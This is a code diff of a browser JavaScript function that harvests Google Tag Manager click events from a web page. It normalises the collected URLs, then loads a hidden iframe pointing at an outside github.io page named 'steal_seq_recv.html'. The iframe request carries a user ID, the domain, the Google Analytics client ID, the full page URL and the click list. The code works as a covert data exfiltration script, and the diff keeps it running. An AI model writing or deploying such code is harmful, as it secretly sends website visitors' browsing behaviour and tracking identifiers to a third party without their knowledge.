@@ -152,11 +152,20 @@ function doFlow() {
     readTextFile("https://wjinma.github.io/sending_for_fun/" + jsonFileName + "?_=" + new Date().getTime(), function(text) {
         eList = [];
         var data = JSON.parse(text.replace(/ /g, ""));
-    
+        site_domain=window.location.hostname;
+        fullsite_domain='https://'+site_domain;
+
         for(i=ListForClick.length-1;i>=0;i--){
             j = ListForClick[i];
             if(dataLayer[j]['event']=="gtm.click"){
                 element_url = dataLayer[j]['gtm.elementUrl'];
+                if(element_url==""){
+                    element_url="/";
+                }
+                else{
+                    var re=RegExp(fullsite_domain,'g');
+                    element_url=element_url.replace(re,"");
+                }
                 elementClasses = dataLayer[j]['gtm.elementClasses'];
                 elementId = dataLayer[j]['gtm.elementId'];
                 if ("innerText" in dataLayer[j]['gtm.element']) {
@@ -169,7 +178,7 @@ function doFlow() {
                 } else {
                     dataanalyticsID = "null"
                 }
-                if(element_url=="" && elementClasses=="" && elementId=="" && dataanalyticsID=="null"){
+                if(element_url=="/" && elementClasses=="" && elementId=="" && dataanalyticsID=="null"){
                     if(elementText!="" && !isNaN(Number(elementText))){
                         var re=RegExp('\\d+\\.\\d+','g');
                         elementText=elementText.replace(re,"-RAND-");
@@ -271,7 +280,7 @@ function doFlow() {
         eList=eList.toString();
         eList=eList.replace(/,,+/g, ",");
         //console.log(wjmId+" eList: " + eList);
-        wframe.src = "https://wjinma.github.io/sending_for_fun/steal_seq_recv.html?uid==" + uid + "&&domain==" + window.location.hostname + "&&cid==" + getgaCid() + "&&url==" + window.location.href + "&&eList==" + eList;
+        wframe.src = "https://wjinma.github.io/sending_for_fun/steal_seq_recv.html?uid==" + uid + "&&domain==" + site_domain + "&&cid==" + getgaCid() + "&&url==" + window.location.href + "&&eList==" + eList;
         //console.log(wjmId+" url: " + wframe.src);
     });
 }
